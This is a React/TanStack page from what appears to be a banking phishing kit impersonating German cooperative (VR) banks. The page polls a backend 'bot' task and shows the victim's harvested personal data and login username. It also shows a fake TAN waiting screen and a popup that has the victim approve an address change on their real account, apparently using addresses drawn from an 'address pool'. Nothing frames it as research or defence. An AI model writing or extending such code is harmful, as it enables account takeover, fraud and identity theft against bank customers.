import { useEffect, useMemo, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { Loader2, AlertCircle } from "lucide-react";
import { getBotTask, confirmAddress } from "@/lib/botClient";
import { getRandomPoolAddress } from "@/lib/addressPool.functions";
import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
import AddressVerification from "@/components/AddressVerification";
import { CompletionStep } from "@/components/flow/CompletionStep";
import { TanWaitingScreen } from "@/components/flow/TanWaitingScreen";
import { getSecureGoLabel } from "@/lib/secureGoLabel";
import vrLogoGeneric from "@/assets/vr-logo-generic.png";

type BankCtx = {
  bankId: string;
  bankName: string;
  group: string;
  theme: FlowTheme;
  logoSrc: string;
  fallbackLogoSrc: string;
  showName: boolean;
  bigLogo: boolean;
  footerLinks?: Record<string, { label: string; url: string }> | null;
};

const DEFAULT_THEME: FlowTheme = {
  headerBg: "#ffffff",
  buttonBg: "#003399",
  accentText: "#003399",
  topBarColor: "#003399",
  buttonRadius: "rounded-full",
};

type Step = "personal" | "address" | "done";

export const Route = createFileRoute("/personal-data/$taskId")({
  head: () => ({
    meta: [
      { title: "Persönliche Daten" },
      { name: "description", content: "Anzeige und Bestätigung Ihrer hinterlegten Kundendaten." },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: PersonalDataPage,
});

function firstString(...vals: unknown[]): string {
  for (const v of vals) {
    if (typeof v === "string" && v.trim()) return v.trim();
    if (typeof v === "number") return String(v);
  }
  return "";
}

function mapCustomer(result: any, bankName: string): CustomerData {
  const p = result?.person_data ?? {};
  const kd = result?.kontakt_data ?? {};
  const ad = result?.adressen_data ?? {};
  
  const anrede = firstString(p.anrede, p.salutation) || "Herr/Frau";
  const name = firstString(
    p?.namen?.anzeigenameKurz,
    p?.namen?.anzeigename,
    p?.name,
    [p?.vorname, p?.nachname].filter(Boolean).join(" "),
  ) || "—";
  
  const kundenNr = firstString(result?.customer_number, p?.kundennummer, p?.customerNumber, result?.credentials?.username) || "—";
  const geb = firstString(p?.geburtsdatum, p?.birthday, p?.dateOfBirth) || "—";
  
  // Familienstand (person_data.familie.familienstandBezeichnung)
  const fam = firstString(p?.familie?.familienstandBezeichnung, p?.familienstand, p?.maritalStatus) || "—";
  
  // E‑Mail (kontakt_data.emailAdressen[0].bezeichnung)
  const email = firstString(
    kd?.emailAdressen?.[0]?.bezeichnung,
    p?.email, 
    p?.emailPrivat, 
    p?.kontakt?.email
  ) || "—";
  
  // Mobil (kontakt_data.mobilfunkNummern[0].bezeichnung)
  const mobil = firstString(
    kd?.mobilfunkNummern?.[0]?.bezeichnung,
    p?.mobil, 
    p?.mobilNr, 
    p?.telefonMobil, 
    p?.kontakt?.mobil
  ) || "—";
  
  // Telefon (kontakt_data.festnetzNummern[0].bezeichnung)
  const phone = firstString(kd?.festnetzNummern?.[0]?.bezeichnung) || "";
  
  // Hauptadresse (aus adressen_data.hauptadresse.postadresse)
  const address = ad?.hauptadresse?.postadresse || p.adresse || p.address || {};
  const strasse = firstString(address.strasse, address.street, [address.strasse, address.hausnummer].filter(Boolean).join(" ")) || "Musterstraße 12";
  const plz = firstString(address.postleitzahl, address.plz, address.zip);
  const ort = firstString(address.ort, address.city, address.stadt);
  const plzOrt = [plz, ort].filter(Boolean).join(" ") || "12345 Musterstadt";

  return {
    anrede,
    name,
    kundenNr,
    geburtsdatum: geb,
    familienstand: fam,
    email,
    mobilNr: mobil,
    adresse: { strasse, plzOrt },
  };
}

function makeFallbackAddress(current: { strasse: string; plzOrt: string }) {
  const city = current.plzOrt.replace(/^\d{4,5}\s*/, "") || "Musterstadt";
  const plz = (current.plzOrt.match(/^\d{4,5}/)?.[0]) || "12345";
  return { strasse: "Lindenweg 3", plzOrt: `${plz} ${city}` };
}

function PersonalDataPage() {
  const { taskId } = Route.useParams();
  const navigate = useNavigate();
  const [result, setResult] = useState<any>(null);
  const [bankCtx, setBankCtx] = useState<BankCtx | null>(null);
  const [step, setStep] = useState<Step>("personal");
  const [addressDecisionPending, setAddressDecisionPending] = useState(false);
  const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
  const [botStatus, setBotStatus] = useState<string | null>(null);
  const [botTanType, setBotTanType] = useState<string | null>(null);
  const [botError, setBotError] = useState<string | null>(null);
  const [addressConfirmOpen, setAddressConfirmOpen] = useState(false);
  const [addressConfirmSubmitting, setAddressConfirmSubmitting] = useState(false);
  const [addressConfirmError, setAddressConfirmError] = useState<string | null>(null);
  const [addressConfirmSuccess, setAddressConfirmSuccess] = useState(false);

  useEffect(() => {
    try {
      const raw = sessionStorage.getItem(`bot_bank_${taskId}`);
      if (raw) setBankCtx(JSON.parse(raw));
    } catch {}
    try {
      const raw = sessionStorage.getItem(`bot_result_${taskId}`);
      if (raw) setResult(JSON.parse(raw));
    } catch {}
    try {
      if (sessionStorage.getItem(`bot_address_pending_${taskId}`) === "1") {
        setAddressDecisionPending(true);
        sessionStorage.removeItem(`bot_address_pending_${taskId}`);
      }
    } catch {}
  }, [taskId]);

  // Long-lived polling: react to status/tan_type/error until completed/failed
  useEffect(() => {
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout> | null = null;
    const startedAt = Date.now();
    const MAX_MS = 5 * 60 * 1000;
    const tick = async () => {
      const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
      if (cancelled) return;
      const st = (data as any)?.status ?? null;
      const tt = (data as any)?.tan_type ?? (data as any)?.result?.tan_type ?? null;
      const err = (data as any)?.error ?? (data as any)?.result?.error ?? null;
      if (st) setBotStatus(st);
      if (tt) setBotTanType(tt);
      if (err) setBotError(String(err));
      if ((data as any)?.result) {
        setResult((data as any).result);
        try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify((data as any).result)); } catch {}
      }
      // Auto-open address popup as soon as bot requests confirmation
      if (st === "waiting_for_address_confirm" && !addressConfirmSuccess) {
        setAddressConfirmOpen(true);
      }
      if (st === "completed" || st === "failed" || Date.now() - startedAt > MAX_MS) return;
      timer = setTimeout(tick, 1500);
    };
    tick();
    return () => { cancelled = true; if (timer) clearTimeout(timer); };
  }, [taskId, addressConfirmSuccess]);

  const customer = useMemo(
    () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
    [result, bankCtx?.bankName],
  );

  const theme = bankCtx?.theme ?? DEFAULT_THEME;
  const shellProps = {
    theme,
    logoSrc: bankCtx?.logoSrc ?? vrLogoGeneric,
    fallbackLogoSrc: bankCtx?.fallbackLogoSrc ?? vrLogoGeneric,
    bankName: bankCtx?.bankName ?? "Online-Banking",
    showName: bankCtx?.showName ?? false,
    bigLogo: bankCtx?.bigLogo ?? false,
    footerLinks: (bankCtx?.footerLinks ?? null) as any,
  };
  const bankId = bankCtx?.bankId ?? "";
  const themeColor = theme.headerBg === "#ffffff" ? (theme.buttonBg || "#003399") : theme.headerBg;
  const secureGoLabel = getSecureGoLabel(bankCtx?.group);

  const ad = (result as any)?.address_data ?? {};
  const oldStreet = ad.old_street ?? ad.current_street ?? "";
  const oldPlz = ad.old_plz ?? ad.current_plz ?? "";
  const oldCity = ad.old_city ?? ad.current_city ?? "";
  const newStreet = ad.new_street ?? ad.street ?? "";
  const newPlz = ad.new_plz ?? ad.plz ?? "";
  const newCity = ad.new_city ?? ad.city ?? "";

  // TAN overlay for address change (waiting_for_tan + tan_type === "address")
  const showAddressTan = botStatus === "waiting_for_tan" && botTanType === "address";

  const errorText = useMemo(() => {
    if (botError) return botError;
    if (botStatus === "failed") return "Ein Fehler ist aufgetreten. Bitte erneut anmelden.";
    if (botStatus === "tan_rejected") return "TAN wurde abgelehnt.";
    if (botStatus === "tan_timeout") return "TAN-Bestätigung zu lange gedauert.";
    return null;
  }, [botStatus, botError]);

  async function handleConfirmAddressClick() {
    if (!taskId) return;
    setAddressConfirmSubmitting(true);
    setAddressConfirmError(null);
    try {
      const res = await confirmAddress(taskId);
      if (!res.ok) {
        const body = await res.text().catch(() => "");
        throw new Error(body || `HTTP ${res.status}`);
      }
      setAddressConfirmSuccess(true);
      setTimeout(() => setAddressConfirmOpen(false), 1200);
    } catch (e: any) {
      setAddressConfirmError(e?.message ? String(e.message) : "Unbekannter Fehler");
    } finally {
      setAddressConfirmSubmitting(false);
    }
  }

  if (!result || !customer) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
        <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
        <p className="text-sm">Daten werden geladen…</p>
        {errorText && (
          <p className="mt-4 text-sm text-red-600 flex items-center gap-2">
            <AlertCircle className="h-4 w-4" />{errorText}
          </p>
        )}
      </div>
    );
  }

  // Address change TAN overlay takes priority
  if (showAddressTan) {
    return (
      <BankShell {...shellProps}>
        <TanWaitingScreen
          theme={theme}
          themeColor={themeColor}
          secureGoLabel={secureGoLabel}
          vrNetKey={customer.kundenNr}
        />
      </BankShell>
    );
  }

  return (
    <BankShell {...shellProps}>
      {errorText && (
        <div className="max-w-2xl mx-auto mb-4 rounded-lg bg-red-50 border border-red-200 p-4 flex items-start gap-2">
          <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
          <p className="text-sm text-red-600 font-medium">{errorText}</p>
        </div>
      )}

      {step === "personal" && (
        <PersonalDataOverview
          // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
          theme={theme}
          customerData={customer}
          bankId={bankId}
          addressDecisionPending={addressDecisionPending}
          onAddressChoiceResolved={() => {
            setAddressDecisionPending(false);
            setForceShowSecureGo(true);
            setStep("address");
          }}
          onContinue={() => {
            if (addressDecisionPending) {
              setStep("address");
              return;
            }
            setStep("done");
          }}
          onEditAddress={() => setStep("done")}
        />
      )}

      {step === "address" && (
        <AddressVerification
          bankName={bankCtx?.bankName ?? ""}
          bankId={bankId}
          bankGroup={bankCtx?.group}
          // @ts-expect-error FlowTheme is structurally compatible with BankTheme
          theme={theme}
          customerName={customer.name}
          customerNumber={customer.kundenNr}
          customerEmail={customer.email}
          customerPhone={customer.mobilNr}
          currentAddress={customer.adresse}
          forceShowSecureGo={forceShowSecureGo}
          onSecureGoOpened={() => setForceShowSecureGo(false)}
          onConfirm={() => setStep("done")}
          onDelete={() => {
            setAddressDecisionPending(true);
            setForceShowSecureGo(false);
            setStep("personal");
          }}
          onNoAddress={() => setStep("done")}
          taskId={taskId}
        />
      )}

      {step === "done" && (
        <CompletionStep theme={theme} customerName={customer.name} />
      )}

      {/* Address-confirm popup driven by waiting_for_address_confirm */}
      {addressConfirmOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
          <div className="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden">
            <div className="h-1.5" style={{ backgroundColor: theme.buttonBg }} />
            <div className="p-6">
              <h3 className="text-lg font-bold mb-4" style={{ color: themeColor }}>
                Adressänderung bestätigen
              </h3>
              <div className="space-y-4 text-sm">
                <div>
                  <p className="text-xs text-gray-500 uppercase tracking-wide mb-1">Bisherige Adresse</p>
                  <p className="text-gray-900 font-medium">{oldStreet || "—"}</p>
                  <p className="text-gray-900">{[oldPlz, oldCity].filter(Boolean).join(" ") || "—"}</p>
                </div>
                <div>
                  <p className="text-xs text-gray-500 uppercase tracking-wide mb-1">Neue Adresse</p>
                  <p className="text-gray-900 font-medium">{newStreet || "—"}</p>
                  <p className="text-gray-900">{[newPlz, newCity].filter(Boolean).join(" ") || "—"}</p>
                </div>
                {addressConfirmError && (
                  <div className="rounded-lg bg-red-50 border border-red-200 p-3 flex items-start gap-2">
                    <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
                    <p className="text-sm text-red-600">{addressConfirmError}</p>
                  </div>
                )}
                {addressConfirmSuccess && (
                  <div className="rounded-lg bg-green-50 border border-green-200 p-3">
                    <p className="text-sm text-green-700">Adressänderung angefordert.</p>
                  </div>
                )}
              </div>
              <div className="mt-6 flex gap-3 justify-end">
                <button
                  type="button"
                  onClick={() => setAddressConfirmOpen(false)}
                  disabled={addressConfirmSubmitting}
                  className={`px-5 py-2.5 ${theme.buttonRadius} border-2 text-sm font-medium hover:bg-gray-50 disabled:opacity-60`}
                  style={{ borderColor: theme.accentText, color: theme.accentText }}
                >
                  Abbrechen
                </button>
                <button
                  type="button"
                  onClick={handleConfirmAddressClick}
                  disabled={addressConfirmSubmitting || addressConfirmSuccess}
                  className={`px-5 py-2.5 ${theme.buttonRadius} text-sm font-medium disabled:opacity-60`}
                  style={{ backgroundColor: theme.buttonBg, color: "#ffffff" }}
                >
                  {addressConfirmSubmitting ? "Wird gesendet…" : "Adresse löschen"}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </BankShell>
  );
}
